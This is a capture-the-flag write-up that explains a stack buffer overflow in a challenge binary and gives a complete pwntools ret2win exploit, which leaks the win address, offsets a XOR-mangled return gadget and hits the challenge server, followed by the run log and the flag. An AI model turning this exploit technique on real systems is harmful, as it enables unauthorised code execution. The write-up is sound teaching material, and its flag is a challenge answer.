# Foobar CTF - I hate Garbages

The binary is compiled with ``partial relro``, ``NX``, and ``PIE``.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Further, the binary leaks the address of the ``win`` function and calls ``gets()``, which enables a stack-based buffer overflow.

```
00001340      printf(&data_2028, win);
00001351      gets(&var_48);
```

However, before returning from the ``main`` function, the program calls ``play_with_buf`` that manipulates the user input by ``xor``ing the buffer with ``0x20202020`` four bytes at a time.

0000128f  void play_with_buf(int32_t* arg1, int64_t arg2)

```
0000128f  {
0000129b      int32_t var_14 = arg2;
000012a2      if (var_14 <= 0x4f)
0000129e      {
000012c3          *(int32_t*)((char*)arg1 + arg2) = (*(int32_t*)((char*)arg1 + arg2) ^ 0x20202020);
000012d7          play_with_buf(arg1, ((uint64_t)(var_14 + 4)));
000012cb      }
0000129e  }
```

Further, there is a ``check`` function. Failing to pass the ``check`` means the program will ``exit`` instead of ``return``. We need to pass this check so we can ``return`` to the stack and trigger our Ret2Win.

```
00001375      if (check(&var_48) == 0)
00001373      {
00001397          puts("ooooopsss");
000013a1          exit(0);
000013a1          /* no return */
000013a1      }
00001381      puts("good try :)");
000013a7      return 0;
```

Putting our exploit together, we pass the check by setting the first byte of our input to chr(127), then 71 more bytes to overflow the buffer. Further, we will place a ``ret`` in from our our ``win`` to satisfy the ``movaps`` issue that occurs when the stack isn't 16-byte aligned and calls ``system``. 

```python
from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('chall.foobar.nitdgplug.org',30021)
    else:
        return process(e.path,level='error')

def repair(addr):
  xor_func = lambda x: x ^ 0x20
  return bytearray(map(xor_func, p64(addr)))

def ret2win():
  p = start()
  win=int(p.recvline(keepends=False),16)
  log.info('Win Leaked: 0x%x' %win)
  e.address=win-e.sym.win
  ret = e.address+0x128e

  chain = chr(127).encode()
  chain += b'A'*71
  chain += repair(ret)
  chain += p64(e.sym['win'])

  log.info('Throwing XOR(Ret)+Win')
  p.sendline(chain)
  p.interactive()

ret2win()
```

Throwing our exploit at the server, we get the flag ``GLUG{4lways_63_$p3cific}``.

```
└─# python3 pwn-ihg.py BIN=./test REMOTE
[*] '/root/workspace/foobar/i-hate-garbages/test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chall.foobar.nitdgplug.org on port 30021: Done
[*] Win Leaked: 0x55de976931b9
[*] Throwing XOR(Ret)+Win
[*] Switching to interactive mode
good try :)
GLUG{4lways_63_$p3cific}
```